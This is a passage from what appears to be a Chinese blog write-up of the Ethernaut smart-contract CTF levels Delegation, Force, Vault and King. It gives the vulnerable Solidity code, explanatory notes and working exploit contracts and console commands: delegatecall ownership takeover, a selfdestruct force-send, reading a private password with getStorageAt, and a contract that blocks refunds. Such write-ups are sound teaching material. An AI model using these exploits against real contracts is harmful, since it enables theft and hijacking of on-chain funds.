<li>slot 大小 &#x2F; packing：<ul>
<li>每个 slot 是 32 字节（256 bit）。</li>
<li>小于 32 字节的连续基础类型会尽可能打包到同一个 slot，从低位（right&#x2F;least-significant）向高位填充，直到满了才进入下一个 slot。</li>
<li>例如 uint128 a; uint128 b; 可以共用一个 slot（a 在低 128 位，b 在高 128 位）。</li>
</ul>
</li>
<li>哪些不打包：<ul>
<li>mapping、dynamic array、string、bytes 不占用顺序 slot；它们在 slot p 存放元数据（比如长度或空值），实际数据位置由 keccak256 计算得到（见下）。</li>
</ul>
</li>
<li>地址尺寸：address 占 20 字节（160 bit）。两个 address 相加为 40 字节 &gt; 32 字节，因此不能放在同一 slot，分别占 slot n 和 slot n+1。</li>
<li>布尔&#x2F;小类型：多个 bool &#x2F; uint8 等可以打包在一起，直到累积 &gt;&#x3D;32 字节才换 slot。</li>
</ol>
<p>delegatecall 执行被调用者的代码，但在调用者自己的 storage 上操作，所以需要对齐 slot，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract Delegate &#123;  </span><br><span class="line">    address public owner; // slot 0  </span><br><span class="line">    function pwn() public &#123; owner = msg.sender; &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">contract Delegation &#123;  </span><br><span class="line">    address public owner;    // slot 0</span><br><span class="line">    Delegate delegate;       // slot 1  </span><br><span class="line">    fallback() external &#123; delegate.delegatecall(msg.data); &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>按规则：</p>
<ol>
<li>Delegate：<ul>
<li>第一个（也是唯一）状态变量 owner → slot 0 。</li>
</ul>
</li>
<li>Delegation：<ul>
<li>第一个声明 owner → slot 0。</li>
<li>第二个 delegate（类型是 address-ish，即存地址的引用）→ slot 1 （因为 address 占 20 字节，slot0 已经被 owner 占用，不可能与 owner 打包到同 slot，且不足以放两个 address）。</li>
</ul>
</li>
</ol>
<p><strong>fallback</strong></p>
<p>当合约被发送 ETH 或被不匹配函数签名的外部调用时自动触发的函数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fallback() external payable &#123;</span><br><span class="line">    /*</span><br><span class="line">	    触发条件：</span><br><span class="line">			1.	调用不存在的函数（函数签名不匹配 ABI）</span><br><span class="line">			2.	或交易 data 不为空，但未匹配函数</span><br><span class="line">			3.	可选择性接收 ETH（加 payable）</span><br><span class="line">		限制：</span><br><span class="line">			•	必须是 external</span><br><span class="line">			•	如果想接收 ETH，必须加 payable</span><br><span class="line">		用途：</span><br><span class="line">			•	捕获未知函数调用</span><br><span class="line">			•	接收 ETH</span><br><span class="line">    */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h2><ul>
<li>delegatecall 在 调用者（Delegation）的 storage 上执行被叫合约（Delegate）的代码。</li>
<li>Delegate 有 <code>pwn()</code>，实现为 <code>owner = msg.sender;</code>，并且 owner 在 Delegate 中是 slot 0。</li>
<li>Delegation 的 owner 也是 slot 0，两者 slot 对齐。</li>
<li>Delegation 中没有定义 <code>pwn()</code>，因此，向 Delegation 发送 <code>pwn()</code> 的 selector（即 <code>calldata = pwn()</code> 的 4 字节 + 空参数）会触发 <code>Delegation.fallback()</code>，它 delegatecall 去执行 <code>Delegate.pwn()</code>，该操作会在 Delegation 的 storage（slot 0）写 msg.sender —— 即把 Delegation.owner 改为发起交易的 EOA。</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">data</span>: web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;pwn()&quot;</span>).<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">10</span>)&#125;);</span><br><span class="line">&#123;<span class="attr">tx</span>: <span class="string">&#x27;0xc0e8afee06c5ec77dc8fb269348b9466a51e7d7eee95d037067a6b70301abd3c&#x27;</span>, <span class="attr">receipt</span>: &#123;…&#125;, <span class="attr">logs</span>: <span class="title class_">Array</span>(<span class="number">0</span>)&#125;</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="string">&#x27;0xFa1490340AAA139B8402d13c9f54e6738EF22bC3&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>web3.utils.keccak256(...)</code> 返回类似 “0xdd365b8b…&lt;更多16进制&gt;” 的十六进制字符串（以 0x 开头）。</li>
<li><code>slice(0,10)</code>取字符串的前10个字符：”0x” + 8 hex chars。</li>
<li>所以 <code>web3.utils.keccak256(&quot;pwn()&quot;).slice(0,10)</code> 的结果就是 “0xdd365b8b”，即函数选择器的十六进制表示。</li>
</ul>
<h1 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h1><h2 id="Description-7"><a href="#Description-7" class="headerlink" title="Description"></a>Description</h2><p>有些合约就是拒绝你的付款,就是这么任性 <code>¯\_(ツ)_/¯</code>，这一关的目标是使合约的余额大于0。</p>
<p>  这可能有帮助:</p>
<ul>
<li>Fallback 方法</li>
<li>有时候攻击一个合约最好的方法是使用另一个合约.</li>
</ul>
<p><strong>Beyond the console</strong>，有些关卡需要在控制台之外的操作。比如，用 solidity 写一些代码，部署合约在网络上，然后攻击实例。这可以通过很多方式完成, 比如：</p>
<ol>
<li>使用 Remix 写代码并部署在相应的网络上。参见 <a target="_blank" rel="noopener" href="https://remix.ethereum.org/">Remix Solidity IDE</a>。</li>
<li>设置一个本地 truffle 项目，开发并部署攻击合约。参见 <a target="_blank" rel="noopener" href="https://trufflesuite.com/">Truffle Framework</a>。</li>
</ol>
<h2 id="Code-7"><a href="#Code-7" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT  </span><br><span class="line">pragma solidity ^0.8.0;  </span><br><span class="line">  </span><br><span class="line">contract Force &#123; /*  </span><br><span class="line">				   MEOW ?         </span><br><span class="line">		  /\_/\  / </span><br><span class="line">	 ____/ o o \    </span><br><span class="line">   /~____  =ø= /  </span><br><span class="line">  (______)__m_m)                   </span><br><span class="line">				*/ &#125;</span><br></pre></td></tr></table></figure>

<h2 id="Memo-7"><a href="#Memo-7" class="headerlink" title="Memo"></a>Memo</h2><p><strong>selfdestruct</strong></p>
<p>在 Solidity 里，selfdestruct 是一个特殊的全局函数，用来销毁合约并将合约账户中剩余的以太币发送到指定地址。</p>
<ul>
<li>删除合约代码：调用后，链上该合约地址的代码和存储数据会被标记为“已销毁”。</li>
<li>转移资金：合约中剩余的 ETH 会被强制发送到 recipient 地址（就算对方是没有 fallback&#x2F;payable 的合约也会强制转入）。</li>
<li>Gas 退款：由于释放了存储空间，调用 selfdestruct 会给调用者返还一部分 gas（在早期版本比较明显，现在 EIP-3529 后退还减少了）。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selfdestruct(address payable recipient);</span><br></pre></td></tr></table></figure>

<ul>
<li>olidity 0.8.18：引入了对 selfdestruct 的弃用警告，提醒开发者避免使用该功能。</li>
<li>EIP-6049（2023 年 3 月）：在以太坊 Dencun 升级中，selfdestruct 的行为被修改，仅在合约创建和销毁发生在同一交易中时，才会删除合约代码和存储；否则，仅转移余额，不删除合约。</li>
</ul>
<blockquote>
<p>当使用 <code>web3.eth.sendTransaction(&#123; to: forceAddress, value: X &#125;)</code> 或者用合约的 transfer &#x2F; send &#x2F; 低级 <code>call&#123;value:...&#125;(&quot;&quot;)</code> 去给目标合约转账时，EVM 会尝试在目标合约上执行接收逻辑（<code>receive()</code> &#x2F; <code>fallback()</code> 或某个 payable 函数），如果目标合约没有任何 payable 接收路径，转账会 revert，交易失败，资金不会被转入。</p>
</blockquote>
<h2 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT  </span><br><span class="line">pragma solidity ^0.8.0;  </span><br><span class="line">  </span><br><span class="line">contract Fore_EXP &#123;  </span><br><span class="line">    constructor() payable &#123;&#125;  </span><br><span class="line">  </span><br><span class="line">    function boom(address payable target) external &#123;  </span><br><span class="line">        selfdestruct(target);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部署时传入 1 wei。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2025/202510032316915.png" alt="image.png"></p>
<p>输入关卡合约实例地址，boom。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2025/202510032140179.png" alt="image.png"></p>
<p>在 <a target="_blank" rel="noopener" href="https://sepolia.etherscan.io/tx/0xe97bbdd3210c927f00a9e03e7685df826c30ce556c7eca708a916f6797c46d17">Etherscan</a> 中可以查询到这笔交易是出于自毁</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2025/202510032140091.png" alt="image.png"></p>
<h1 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h1><h2 id="Description-8"><a href="#Description-8" class="headerlink" title="Description"></a>Description</h2><p>打开 vault 来通过这一关!</p>
<h2 id="Code-8"><a href="#Code-8" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT  </span><br><span class="line">pragma solidity ^0.8.0;  </span><br><span class="line">  </span><br><span class="line">contract Vault &#123;  </span><br><span class="line">    bool public locked;  </span><br><span class="line">    bytes32 private password;  </span><br><span class="line">  </span><br><span class="line">    constructor(bytes32 _password) &#123;  </span><br><span class="line">        locked = true;  </span><br><span class="line">        password = _password;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    function unlock(bytes32 _password) public &#123;  </span><br><span class="line">        if (password == _password) &#123;  </span><br><span class="line">            locked = false;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Memo-8"><a href="#Memo-8" class="headerlink" title="Memo"></a>Memo</h2><p><strong>getStorageAt</strong></p>
<p>getStorageAt 是一个 Web3 &#x2F; Ethers.js 提供的函数（并不是 Solidity 内置函数），用于读取链上某个合约在某个存储槽（storage slot）的原始值。</p>
<ul>
<li>Solidity 的合约状态变量最终都存储在 EVM Storage 中。</li>
<li>EVM Storage 是一个 32 字节（256 bit）为单位的 key-value 数据结构。</li>
<li>每个状态变量、映射、数组都有固定或计算出的存储槽（slot）。</li>
<li>getStorageAt 可以直接读取某个槽的数据，不经过 getter 或函数调用。</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> provider.<span class="title function_">getStorageAt</span>(contractAddress, slotIndex);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>EVM 里链上状态是全局共享的，只能通过链上交易来修改。普通函数调用（call）只是节点本地模拟，不会广播。</p>
</blockquote>
<h2 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution"></a>Solution</h2><p>区块链上的 private 只是对 Solidity 代码的可见性限制，存储在合约 storage 的数据对所有人都是可读的。</p>
<p>Web3 &#x2F; Ethers.js 提供的函数 getStorageAt，用于读取链上某个合约在某个存储槽（storage slot）的原始值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract Vault &#123;  </span><br><span class="line">    bool public locked;  // slot 0</span><br><span class="line">    bytes32 private password;  // slot 1 - 确定 slotIndex</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contract.<span class="property">address</span>, <span class="number">1</span>);</span><br><span class="line"><span class="string">&#x27;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#x27;</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">unlock</span>(<span class="params"><span class="string">&quot;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&quot;</span></span>)</span><br><span class="line">&#123;<span class="attr">tx</span>: <span class="string">&#x27;0x673198812ad4bd3c7f569db64d0d6ba74e6d422763c185ef76057033e7b4f40d&#x27;</span>, <span class="attr">receipt</span>: &#123;…&#125;, <span class="attr">logs</span>: <span class="title class_">Array</span>(<span class="number">0</span>)&#125;</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">locked</span>()</span><br><span class="line"><span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h1 id="King"><a href="#King" class="headerlink" title="King"></a>King</h1><h2 id="Description-9"><a href="#Description-9" class="headerlink" title="Description"></a>Description</h2><p>下面的合约表示了一个很简单的游戏：任何一个发送了高于目前价格的人将成为新的国王。在这个情况下，上一个国王将会获得新的出价，这样可以赚得一些以太币。看起来像是庞氏骗局。</p>
<p>这么有趣的游戏，你的目标是攻破他。当你提交实例给关卡时，关卡会重新申明王位。你需要阻止他重获王位来通过这一关。</p>
<h2 id="Code-9"><a href="#Code-9" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT  </span><br><span class="line">pragma solidity ^0.8.0;  </span><br><span class="line">  </span><br><span class="line">contract King &#123;  </span><br><span class="line">    address king;  </span><br><span class="line">    uint256 public prize;  </span><br><span class="line">    address public owner;  </span><br><span class="line">  </span><br><span class="line">    constructor() payable &#123;  </span><br><span class="line">        owner = msg.sender;  </span><br><span class="line">        king = msg.sender;  </span><br><span class="line">        prize = msg.value;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    receive() external payable &#123;  </span><br><span class="line">        require(msg.value &gt;= prize || msg.sender == owner);  </span><br><span class="line">        payable(king).transfer(msg.value);  </span><br><span class="line">        king = msg.sender;  </span><br><span class="line">        prize = msg.value;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    function _king() public view returns (address) &#123;  </span><br><span class="line">        return king;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Memo-9"><a href="#Memo-9" class="headerlink" title="Memo"></a>Memo</h2><p><strong>转账操作触发回调函数</strong></p>
<p>在 Solidity &#x2F; EVM 中，当 EOA &#x2F; 合约 收到 ETH 时：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">收款账户类型</span><br><span class="line">├─ EOA → 不触发回退函数，余额增加</span><br><span class="line">└─ 合约</span><br><span class="line">    └─ 是否有 receive/fallback?</span><br><span class="line">		├─ 有</span><br><span class="line">        │   ├─ transfer/send (固定 2300 gas)</span><br><span class="line">        │   │   ├─ 回退函数消耗 ≤ 2300 → 执行函数成功</span><br><span class="line">        │   │   └─ 回退函数消耗 &gt; 2300 → transfer revert / send false</span><br><span class="line">        │   └─ call&#123;value:...&#125; (默认剩余 gas，可自定义 gas)</span><br><span class="line">        │       ├─ 回退函数消耗 ≤ 提供 gas → 执行函数成功</span><br><span class="line">        │       └─ 回退函数消耗 &gt; 提供 gas → 返回 false</span><br><span class="line">        └─ 无</span><br><span class="line">            ├─ transfer → revert</span><br><span class="line">            ├─ send → 返回 false</span><br><span class="line">            └─ call → 成功，余额增加</span><br></pre></td></tr></table></figure>

<h2 id="Solution-7"><a href="#Solution-7" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">receive() external payable &#123;  </span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);  </span><br><span class="line">    payable(king).transfer(msg.value);  // 转给旧王</span><br><span class="line">    king = msg.sender;  </span><br><span class="line">    prize = msg.value;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<ol>
<li>某个账户&#x2F;合约 A 向 King 支付 msg.value 并触发 King.receive()。在函数里：<ul>
<li>先检查资金是否足够（或调用者是 owner） <code>require(msg.value &gt;= prize || msg.sender == owner)</code> 。</li>
<li>如果 require 失败，整个交易直接 revert，后面的都不执行。</li>
</ul>
</li>
<li>如果 require 通过，执行 <code>payable(king).transfer(msg.value);</code>：<ul>
<li>这会把收到的 Ether 发送给当前（旧）king（注意：这里用的是旧 king，state 还没改）。</li>
<li>如果旧 king 是一个合约，则会尝试调用该合约的回退函数（receive&#x2F;fallback）。</li>
<li>如果旧 king 的回退函数 <code>revert()</code> 或因为其他原因导致转账失败，那么 transfer 会失败并导致当前 <code>King.receive()</code> 整体 revert，更新 king 的代码永远不会执行。</li>
<li>如果旧 king 是 EOA 或者合约正确接收（不 revert），transfer 成功，函数继续执行。</li>
</ul>
</li>
<li>在第 2 步成功之后，才会更新状态 <code>king = msg.sender; prize = msg.value;</code>，把 msg.sender 设为新的 king（msg.sender 在这个调用里就是发起者的地址；如果是合约发起者，哪怕它还在构造中，这个地址也是确定的）。</li>
</ol>
<p>King_EXP.sol</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT  </span><br><span class="line">pragma solidity ^0.8.0;  </span><br><span class="line">  </span><br><span class="line">contract King_EXP &#123;  </span><br><span class="line">    constructor(address kingAddr) payable &#123;  </span><br><span class="line">        (bool sent, ) = kingAddr.call&#123;value: msg.value&#125;(&quot;&quot;);  </span><br><span class="line">        require(sent, &quot;fail&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    // receive() external payable &#123;  </span><br><span class="line">    //     revert(&quot;kneel&quot;);    </span><br><span class="line">    // &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在合约账户中，如果收到以太且合约中没有回调函数，对于 transfer 会自动 revert，所以这里的 <code>receive()</code> 可略。或者可以利用 &gt;2300 gas 触发 revert。固定 2300 gas，写入消耗 gas &gt; 0，大于 2300 gas，触发 revert。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uint256 heavy = 1;</span><br><span class="line">receive() external payable &#123;</span><br><span class="line">	heavy = 1;  // SSTORE(Storage Store)：从 0 -&gt; 非0，耗费 gas（大于2300）</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="string">&#x27;0x3049C00639E6dfC269ED1451764a046f7aE500c6&#x27;</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">_king</span>()</span><br><span class="line"><span class="string">&#x27;0x3049C00639E6dfC269ED1451764a046f7aE500c6&#x27;</span></span><br><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">prize</span>()).<span class="title function_">toString</span>()</span><br><span class="line"><span class="string">&#x27;1000000000000000&#x27;</span></span><br></pre></td></tr></table></figure>

<p>转入 1000000000000001 wei 即可。1000000000000000 wei &#x3D;&#x3D; 1 finney。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2025/202510040255668.png" alt="image.png"></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">prize</span>()).<span class="title function_">toString</span>()</span><br><span class="line"><span class="string">&#x27;1000000000000001&#x27;</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">_king</span>()</span><br><span class="line"><span class="string">&#x27;0x2e119fEDd802E5f5d7dd8Bf8fd221dEcb5463dEF&#x27;</span></span><br></pre></td></tr></table></figure>


	  <!--
<div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>
-->
	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/11/20/pentest/lateral/Active Directory Enumeration & Attacks/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2025-09-01 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/BlockChain/">BlockChain<span>1</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/Ethernaut/">Ethernaut<span>1</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Hello-Ethernaut"><span class="toc-article-text">Hello Ethernaut</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Description"><span class="toc-article-text">Description</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Solution"><span class="toc-article-text">Solution</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Memo"><span class="toc-article-text">Memo</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Code"><span class="toc-article-text">Code</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Fallback"><span class="toc-article-text">Fallback</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Description-1"><span class="toc-article-text">Description</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Code-1"><span class="toc-article-text">Code</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Memo-1"><span class="toc-article-text">Memo</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Soulution"><span class="toc-article-text">Soulution</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Fallout"><span class="toc-article-text">Fallout</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Description-2"><span class="toc-article-text">Description</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Code-2"><span class="toc-article-text">Code</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Memo-2"><span class="toc-article-text">Memo</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Solustion"><span class="toc-article-text">Solustion</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Coin-Flip"><span class="toc-article-text">Coin Flip</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Description-3"><span class="toc-article-text">Description</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Code-3"><span class="toc-article-text">Code</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Memo-3"><span class="toc-article-text">Memo</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Solution-1"><span class="toc-article-text">Solution</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Telephone"><span class="toc-article-text">Telephone</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Description-4"><span class="toc-article-text">Description</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Code-4"><span class="toc-article-text">Code</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Memo-4"><span class="toc-article-text">Memo</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Solution-2"><span class="toc-article-text">Solution</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Token"><span class="toc-article-text">Token</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Description-5"><span class="toc-article-text">Description</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Code-5"><span class="toc-article-text">Code</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Memo-5"><span class="toc-article-text">Memo</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Solution-3"><span class="toc-article-text">Solution</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Delegation"><span class="toc-article-text">Delegation</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Description-6"><span class="toc-article-text">Description</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Code-6"><span class="toc-article-text">Code</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Memo-6"><span class="toc-article-text">Memo</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Solution-4"><span class="toc-article-text">Solution</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Force"><span class="toc-article-text">Force</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Description-7"><span class="toc-article-text">Description</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Code-7"><span 